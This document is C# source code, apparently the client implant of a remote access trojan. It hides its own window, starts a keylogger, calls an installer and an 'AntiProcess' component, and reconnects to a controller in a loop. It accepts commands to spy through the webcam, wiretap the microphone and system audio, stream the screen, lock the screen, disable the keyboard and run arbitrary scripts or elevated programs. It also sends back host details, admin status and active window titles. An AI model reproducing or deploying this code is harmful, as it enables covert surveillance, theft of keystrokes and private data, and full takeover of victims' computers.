                else if (cmd[0] == "keyboard")
                {
                    if (keyboard == null)
                        keyboard = new Keyboard();

                    if (cmd[1] == "vk")
                    {
                        Keys key = (Keys)int.Parse(cmd[3]);
                        if (cmd[2] == "down")
                        {
                            keyboard.KeyDown(key);
                        }
                        else if (cmd[2] == "up")
                        {
                            keyboard.KeyUp(key);
                        }
                    }
                    else if (cmd[1] == "enable")
                    {
                        keyboard.Enable();
                    }
                    else if (cmd[1] == "disable")
                    {
                        keyboard.Disable();
                    }
                    else if (cmd[1] == "smile")
                    {
                        keyboard.SmileKey(true);
                    }
                    else if (cmd[1] == "poker")
                    {
                        keyboard.SmileKey(false);
                    }
                }
                #endregion
                #region Keylogger
                else if (cmd[0] == "keylogger")
                {
                    if (keylogger == null)
                        keylogger = new KeyLogger();

                    if (cmd[1] == "start") //START KEY LOGGER
                    {
                        
                    }
                    else if (cmd[1] == "stop") //STOP KEY LOGGER
                    {

                    }
                    else if (cmd[1] == "read") //READ KEY LOGGER FILE
                    {
                        v.encSend(2, 0, $"keylogger|read|{Crypto.b64E2Str(keylogger.file_keylogger)}|" + Crypto.b64E2Str(keylogger.Read()));
                    }
                    else if (cmd[1] == "new")
                    {
                        var x = keylogger.NewFile();
                    }
                    else if (cmd[1] == "del")
                    {
                        var x = keylogger.Delete();
                    }
                }
                #endregion
                #region Webcam
                else if (cmd[0] == "webcam")
                {
                    if (cmd[1] == "init")
                    {
                        webcam = new Webcam();
                        v.encSend(2, 0, "webcam|init|" + string.Join(",", webcam.GetDevices()));
                    }
                    else if (cmd[1] == "start" || cmd[1] == "snapshot")
                    {
                        if (webcam != null && webcam.stop_capture == false)
                        {
                            webcam.stop_capture = true;

                            while (!webcam.is_stopped)
                                Thread.Sleep(1000);

                            webcam = null;
                        }

                        webcam = new Webcam();
                        webcam.stop_capture = false;
                        webcam.snapshot = (cmd[1] == "snapshot");
                        webcam.v = v;
                        new Thread(() => webcam.StartCapture(int.Parse(cmd[2]))).Start();
                    }
                    else if (cmd[1] == "stop")
                    {
                        if (webcam != null && webcam.stop_capture == false)
                        {
                            webcam.stop_capture = true;

                            while (!webcam.is_stopped)
                                Thread.Sleep(1000);

                            webcam = null;
                        }
                    }
                    else if (cmd[1] == "monitor")
                    {
                        if (mulcam != null)
                        {
                            mulcam.stop_capture = false;
                            while (!mulcam.is_stopped)
                                Thread.Sleep(100);
                        }

                        if (cmd[2] == "snapshot")
                        {
                            mulcam.stop_capture = false;
                            mulcam.snapshot = true;

                        }
                        else if (cmd[2] == "start")
                        {

                        }
                        else if (cmd[2] == "stop")
                        {

                        }
                    }
                }
                #endregion
                #region FunStuff
                else if (cmd[0] == "fun")
                {
                    if (cmd[1] == "msg")
                    {
                        string mode = cmd[2];
                        string param = cmd[3];

                        string title = Crypto.b64D2Str(cmd[4]);
                        string text = Crypto.b64D2Str(cmd[5]);

                        if (mode == "mul")
                        {
                            for (int i = 0; i < int.Parse(param); i++)
                            {
                                MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), cmd[6], true);
                                MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);
                                new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
                            }
                        }
                        else if (mode == "inf")
                        {
                            if (param == "start")
                            {
                                MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), cmd[6], true);
                                MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), cmd[7], true);

                                msg_inf = true;
                                while (msg_inf)
                                {
                                    new Thread(() => MessageBox.Show(text, title, btn, icon)).Start();
                                    Thread.Sleep(100);
                                }
                            }
                            else if (param == "stop")
                            {
                                msg_inf = false;
                            }
                        }
                    }
                    else if (cmd[1] == "screen")
                    {
                        frmLockScreen f_lock = null;
                        foreach (Form f in Application.OpenForms)
                        {
                            if (f.GetType() == typeof(frmLockScreen) && (Victim)f.Tag == v)
                            {
                                f_lock = (frmLockScreen)f;
                                fs.Add(f_lock);
                            }
                        }
                        if (keyboard == null)
                            keyboard = new Keyboard();

                        if (cmd[2] == "lock")
                        {
                            if (f_lock == null || f_lock.IsDisposed)
                            {
                                //DISABLE KEYBOARD AND MOUSE


                                //SHOW IMAGE
                                Invoke(new Action(() =>
                                {
                                    foreach (Screen screen in Screen.AllScreens)
                                    {
                                        f_lock = new frmLockScreen();
                                        f_lock.Tag = v;
                                        f_lock.Show();
                                        f_lock.Focus();
                                        f_lock.BringToFront();
                                        f_lock.Location = new Point(screen.Bounds.Left, screen.Bounds.Top);
                                        f_lock.WindowState = FormWindowState.Maximized;
                                        f_lock.ShowImage(cmd[3]);
                                        l_frmLockScreen.Add(f_lock);
                                    }
                                }));
                                v.encSend(2, 0, "fun|screen|lock|1");
                            }
                            else
                            {
                                foreach (frmLockScreen f in l_frmLockScreen)
                                {
                                    f.ShowImage(cmd[3]);
                                }
                            }
                            keyboard.Disable();
                        }
                        else if (cmd[2] == "ulock")
                        {
                            foreach (frmLockScreen f in l_frmLockScreen)
                            {
                                f.allow_close = true;
                                f.Close();
                            }
                            l_frmLockScreen.Clear();
                            keyboard.Enable();
                        }
                    }
                    else if (cmd[1] == "wp") //wallpaper
                    {

                    }
                }
                #endregion
                #region Chat Message
                else if (cmd[0] == "chat")
                {
                    frmChat f_chat = null;
                    foreach (Form f in Application.OpenForms)
                    {
                        if (f.GetType() == typeof(frmChat) && (Victim)f.Tag == v)
                        {
                            f_chat = (frmChat)f;
                            break;
                        }
                    }

                    if (cmd[1] == "init")
                    {
                        if (f_chat == null || f_chat.IsDisposed)
                        {
                            Invoke(new Action(() =>
                            {
                                f_chat = new frmChat();
                                f_chat.v = v;
                                f_chat.Tag = v;
                                f_chat.ShowIcon = false;
                                f_chat.ShowInTaskbar = false;
                                f_chat.Text = $@"Message";
                                f_chat.Show();
                            }));
                        }
                    }
                    else if (cmd[1] == "msg")
                    {
                        f_chat.ShowMsg(Crypto.b64D2Str(cmd[2]), Crypto.b64D2Str(cmd[3]).Trim());
                    }
                    else if (cmd[1] == "max")
                    {
                        f_chat.WindowState = FormWindowState.Maximized;
                    }
                    else if (cmd[1] == "min")
                    {
                        f_chat.WindowState = FormWindowState.Minimized;
                    }
                    else if (cmd[1] == "n")
                    {
                        f_chat.WindowState = FormWindowState.Normal;
                    }
                    else if (cmd[1] == "close")
                    {
                        f_chat.CloseForm();
                    }
                }
                #endregion
                #region Audio(Sound)
                else if (cmd[0] == "audio")
                {
                    if (funcMicAudio == null)
                    {
                        string mic_output = Path.Combine(Path.GetTempPath(), "wt_mic.wav");
                        string sys_output = Path.Combine(Path.GetTempPath(), "wt_sys.wav");
                        funcMicAudio = new MicAudio(v, mic_output, sys_output);
                    }
                    if (funcAudioPlayer == null)
                        funcAudioPlayer = new AudioPlayer();

                    if (cmd[1] == "init")
                    {
                        v.encSend(2, 0, "audio|init|" + funcMicAudio.Init());
                    }
                    else if (cmd[1] == "vol") //VOLUME
                    {
                        float vol = float.Parse(cmd[2]);
                        funcMicAudio.SetSystemAudioVolume(vol);
                    }
                    else if (cmd[1] == "mute")
                    {
                        if (cmd[2] == "mute")
                        {
                            funcMicAudio.DisableMute = false;
                            funcMicAudio.MuteDevice = true;
                            funcMicAudio.SetSystemAudioVolume(0.0f);
                        }
                        else if (cmd[2] == "unmute")
                        {
                            funcMicAudio.MuteDevice = false;
                        }
                        else if (cmd[2] == "disable") //SHUT SOMEONE MOUTH
                        {
                            funcMicAudio.MuteDevice = false;
                            funcMicAudio.DisableMute = true;
                        }
                        else if (cmd[2] == "enable") //MAKE SOMEONE EMBARRASSING
                        {
                            funcMicAudio.DisableMute = false;
                        }

                        v.encSend(2, 0, "audio|update|" + cmd[2]);
                    }
                    else if (cmd[1] == "speak")
                    {
                        if (cmd[2] == "text")
                        {
                            funcMicAudio.SpeechText(Crypto.b64D2Str(cmd[3]), int.Parse(cmd[4]));
                        }
                    }
                    else if (cmd[1] == "play")
                    {
                        if (cmd[2] == "sys")
                        {
                            int times = int.Parse(cmd[3]);
                            int sound = int.Parse(cmd[4]);

                            for (int i = 0; i < times; i++)
                                funcAudioPlayer.SystemSound(int.Parse(cmd[4]));
                        }
                        else if (cmd[2] == "mp3")
                        {

                        }
                    }
                    else if (cmd[1] == "wiretap") //EVASDROPPING
                    {
                        string type = string.Empty; //ONLINE, OFFLINE
                        if (cmd.Length > 3)
                            type = cmd[3];

                        if (cmd[2] == "system") //SYSTEM AUDIO
                        {
                            if (cmd[4] == "start")
                            {
                                funcMicAudio.StartWiretapping(cmd[5], int.Parse(cmd[6]));
                            }
                            else if (cmd[4] == "stop")
                            {
                                funcMicAudio.StopWiretapping(cmd[5], int.Parse(cmd[6]));
                            }
                            else if (cmd[4] == "write")
                            {
                                funcMicAudio.MicAudioWriteMP3 = bool.Parse(cmd[5]);
                            }
                            else if (cmd[4] == "read")
                            {

                            }
                        }
                        else if (cmd[2] == "micro") //MICROPHONE
                        {
                            if (cmd[4] == "start")
                            {
                                funcMicAudio.StartWiretapping(cmd[5], int.Parse(cmd[6]));
                            }
                            else if (cmd[4] == "stop")
                            {
                                funcMicAudio.StopWiretapping(cmd[5], int.Parse(cmd[6]));
                            }
                            else if (cmd[4] == "write")
                            {
                                funcMicAudio.SysAudioWriteMP3 = bool.Parse(cmd[5]);
                            }
                            else if (cmd[4] == "read")
                            {

                            }
                        }
                    }
                    else if (cmd[1] == "close")
                    {
                        //Reset All

                    }
                }
                #endregion
                #region Run Script
                else if (cmd[0] == "exec")
                {
                    if (funcRunScript == null)
                        funcRunScript = new FuncRunScript();

                    string szPayload = Crypto.b64D2Str(cmd[2]);
                    string szParam = Crypto.b64D2Str(cmd[3]);

                    if (cmd[1] == "bat")
                    {
                        
                    }
                    else if (cmd[1] == "cs")
                    {
                        var x = funcRunScript.EvaluateCS(szPayload, szParam.Split(' '));
                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "vb")
                    {
                        var x = funcRunScript.EvaluateVB(szPayload, szParam.Split(' '));
                    }
                    else if (cmd[1] == "file")
                    {
                        bool runas = cmd[2] == "1";
                        string file = Crypto.b64D2Str(cmd[3]);
                        string param = Crypto.b64D2Str(cmd[4]);

                        Process p = new Process()
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = file,
                                Arguments = param,
                            }
                        };

                        if (runas)
                            p.StartInfo.Verb = "runas";

                        p.Start();
                    }
                }
                #endregion
            }
            catch (Exception ex)
            {
                v.SendCommand($"error|{Crypto.b64E2Str(ex.Message)}");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="query"></param>
        /// <returns></returns>
        static string WMI_Query(string query)
        {
            List<string> result = new List<string>();
            using (var search = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection coll = search.Get())
                {
                    try
                    {
                        foreach (var device in coll)
                        {
                            List<string> tmp = new List<string>();
                            foreach (PropertyData data in device.Properties)
                            {
                                tmp.Add(Crypto.b64E2Str($"{data.Name};{device[data.Name]}"));
                            }
                            result.Add(Crypto.b64E2Str(string.Join(",", tmp.ToArray())));
                        }
                    }
                    catch (Exception ex)
                    {
                        ;
                        Console.WriteLine(ex.Message);
                    }
                }
            }
            return string.Join(",", result.ToArray());
        }
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>

        //--------------[ REMOTE DESKTOP | START ]--------------\\
        /// <summary>
        /// Convert bitmap bytes to base-64 string.
        /// </summary>
        /// <param name="bitmap"></param>
        /// <returns></returns>
        /// <summary>
        /// Return index by monitor device name.
        /// </summary>
        /// <param name="device_name"></param>
        /// <returns></returns>
        static int FindDesktopIndex(string device_name)
        {
            int idx = 0;
            for (int i = 0; i < Screen.AllScreens.Length; i++)
            {
                if (Screen.AllScreens[i].DeviceName.Equals(device_name, StringComparison.OrdinalIgnoreCase))
                {
                    idx = i;
                    break;
                }
            }

            return idx;
        }
        /// <summary>
        /// Capture screen image and convert bitmap into base64 then return.
        /// </summary>
        /// <param name="v"></param>
        /// <param name="device_name"></param>
        /// <param name="width"></param>
        /// <param name="height"></param>
        /// <returns></returns>
        static string ScreenShot(Victim v, string device_name, int width, int height)
        {
            int idx = FindDesktopIndex(device_name);
            Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
            Rectangle capture_rect = Screen.AllScreens[idx].Bounds;
            Graphics capture_graphics = Graphics.FromImage(bitmap);
            capture_graphics.CopyFromScreen(capture_rect.Left, capture_rect.Top, 0, 0, capture_rect.Size);
            string b64_image = Global.BitmapToBase64(bitmap);

            return b64_image;
        }
        /// <summary>
        /// Start remote desktop live.
        /// </summary>
        /// <param name="v"></param>
        /// <param name="device_name"></param>
        /// <param name="width"></param>
        /// <param name="height"></param>
        static void DesktopStart(Victim v, string device_name, int width, int height)
        {
            while (is_connected && send_screenshot)
            {
                string b64_img = ScreenShot(v, device_name, width, height);
                v.encSend(2, 0, "desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                //Thread.Sleep(10);
            }
            send_stopped = true;
        }
        /// <summary>
        /// Initialization of reomte desktop.
        /// </summary>
        /// <param name="v"></param>
        static void DesktopInit(Victim v)
        {
            List<string> result = new List<string>();
            foreach (var screen in Screen.AllScreens)
            {
                var bounds = screen.Bounds;
                string name = screen.DeviceName;
                int left = bounds.Left;
                int top = bounds.Top;
                int width = bounds.Width;
                int height = bounds.Height;
                result.Add($"{name},{left},{top},{width},{height}");
            }
            string data = string.Join("+", result.ToArray());
            v.SendCommand("desktop|init|" + data);
        }
        //--------------[ REMOTE DESKTOP | END ]--------------\\

        //--------------[ CLIENT INFO | START ]--------------\\
        
        /// <summary>
        /// Check current user is admin.
        /// </summary>
        /// <returns></returns>
        public static bool isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Send victim data.
        /// </summary>
        /// <param name="v"></param>
        void SendInfo(Victim v)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            string[] id_array = Global.WMI_QueryNoEncode("select serialnumber from win32_diskdrive");
            string szSerialNumber = id_array[0].Replace(" ", string.Empty).Trim();

            while (is_connected)
            {
                try
                {
                    //if (string.IsNullOrEmpty(id_hardware))
                    //    id_hardware = GetHardDriveSerialNumber();

                    //string[] webcam_devices = new Webcam().GetDevices().Split(',');
                    //MessageBox.Show(webcam_devices[0]);

                    string[] info_array = new string[]
                    {
                        "info",
                        $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}",
                        Environment.UserName,
                        isAdmin() ? "Yes" : "No",
                        Global.getOS(),
                        "", //PING
                        Global.getCPU(), //CPU
                        Screen.AllScreens.Length.ToString(), //MONITOR
                        new Webcam().GetDevices().Count.ToString(), //WEBCAM
                        Crypto.b64E2Str(Global.GetActiveWindowTitle()),
                        send_screen ? ScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height) : string.Empty,
                    };

                    string info = string.Join("|", info_array);
                    v.SendCommand(info);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                    Thread.Sleep(time_sendinfo);
                }
            }
        }
        //--------------[ CLIENT INFO | END ]--------------\\

        void ReleaseFunction()
        {
            if (funcMicAudio != null)
                funcMicAudio = null;
        }
        void Disconnect()
        {
            if (is_connected)
            {
                socket.Close();
            }
        }
        void Reconnect()
        {
            if (is_connected)
            {
                socket.Close();
                is_connected = false;
            }
        }
        void Connect()
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(ip, port);
                Victim v = new Victim(socket);
                //socket.BeginReceive(v.buffer, 0, v.buffer.Length, SocketFlags.None, new AsyncCallback(Received), v);
                new Thread(() => Received(v)).Start();
                is_connected = true;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }
        void Main()
        {
            Installer installer = new Installer();
            installer.Start();

            keylogger = new KeyLogger();
            new Thread(() => keylogger.Start()).Start();
            //keylogger.Start();
            if (anti_process)
                new Thread(() => new AntiProcess().Start()).Start();
            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        if (!is_connected)
                        {
                            Connect();
                        }
                    }
                    catch (Exception ex)
                    {
                        //MessageBox.Show(ex.Message);
                    }
                    Thread.Sleep(time_reconnect);
                }
            }).Start();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            new Thread(() => Main()).Start();
        }
    }
}